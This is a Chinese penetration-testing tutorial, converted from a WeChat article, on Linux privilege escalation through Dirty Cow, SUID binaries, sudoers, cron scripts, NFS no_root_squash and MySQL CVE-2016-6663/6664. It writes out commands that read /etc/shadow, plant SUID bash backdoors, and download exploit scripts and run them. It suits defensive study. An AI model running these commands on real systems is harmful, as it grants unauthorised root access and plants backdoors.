> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fReLVJQ4mv46XBgjrgk43g)

在渗透测试过程中，提升权限是非常关键的一步，攻击者往往可以通过利用内核漏洞/权限配置不当/root权限运行的服务等方式寻找突破点，来达到提升权限的目的。

* * *

**1、内核漏洞提权**

提起内核漏洞提权就不得不提到脏牛漏洞（Dirty Cow），是存在时间最长且影响范围最广的漏洞之一。低权限用户可以利用该漏洞实现本地提权，同时可以通过该漏洞实现Docker容器逃逸，获得root权限的shell。

**1.1 本地内核提权**

（1）检测内核版本

```


```
`# 查看系统发行版本``lsb_release -a``# 查看内核版本``uname -a`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

(2) 下载，编译生成exp文件

```


```
bypass@ubuntu:~$ make
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

（3）执行成功，返回一个root权限的shell。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**1.2 利用DirtyCow漏洞实现Docker逃逸**

（1）进入容器，编译POC并执行：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（2）在攻击者机器上，成功接收到宿主机反弹的shell。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**1.3 Linux提权辅助工具**

github项目地址：

```
https://github.com/mzet-/linux-exploit-suggester.git
```

（1）根据操作系统版本号自动查找相应提权脚本

```


```
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```


```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（2）根据提示下载poc，编译执行。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**2、利用SUID提权**

SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限。

（1）在Linux中查找可以用来提权的SUID文件

```


```
find / -perm -u=s -type f 2>/dev/null
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

（2）通过find以root权限执行命令

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

可用作Linux提权的命令及其姿势:

```


```
`#Find``find pentestlab -exec whoami \;``#Vim``vim.tiny /etc/shadow``#awk``awk 'BEGIN{system("whoami")}'``#curl``curl file:///etc/shadow``#Bash``bash -p` `#Less``less /etc/passwd``#Nmap``nmap --interactive`
```




```

**3、SUDO提权**

普通用户在使用sudo执行命令的过程中，会以root方式执行命令。在很多场景里，管理员为了运维管理方便，sudoer配置文件错误导致提权。

（1）设置sudo免密码

```


```
`$vi /etc/sudoers``在最后一行添加：bypass ALL=(ALL:ALL) NOPASSWD:ALL`
```




```

（2）查看sudo的权限

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**4、计划任务**

如果可以找到可以有权限修改的计划任务脚本，就可以修改脚本实现提权。本质上，就是文件权限配置不当。

（1）查看计划任务，找到有修改权限的计划任务脚本。

```
`ls -l /etc/cron*``more /etc/crontab`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（2）在mysqlback.sh 添加 SUID shell后门，当定时任务以root再次执行的时候，可以获取root权限。  

```


```
`cp /bin/bash /tmp/shell``chmod u+s /tmp/shell`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

**5、NFS提权**

当服务器中存在NFS共享，开启no_root_squash选项时，如果客户端使用的是root用户，那么对于共享目录来说，该客户端就有root权限，可以使用它来提升权限。

（1）查看NFS服务器上的共享目录

```


```
sudo showmount -e 10.1.1.233
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

（2）创建本地挂载目录，挂载共享目录。使用攻击者本地root权限创建Suid shell。

```


```
`sudo mkdir -p /tmp/data``sudo mount -t nfs 10.1.1.233:/home/bypass /tmp/data``cp /bin/bash /tmp/data/shell``chmod u+s /tmp/data/shell`
```




```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（3）回到要提权的服务器上，使用普通用户使用-p参数来获取root权限。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**6、MySQL提权**

MySQL提权方式有UDF提权，MOF提权，写入启动项提权等方式，但比较有意思的是CVE-2016-6663、CVE-2016-6664组合利用的提取场景，可以将一个www-data权限提升到root权限。

（1）利用CVE-2016-6663将www-data权限提升为mysql权限：

```


```
`cd /var/www/html/``gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient``./mysql-privesc-race test 123456 localhost testdb`
```




```

（2）利用CVE-2016-6664将Mysql权限提升为root权限：

```


```
`wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh``chmod 777 mysql-chowned.sh``./mysql-chowned.sh /var/log/mysql/error.log`
```




```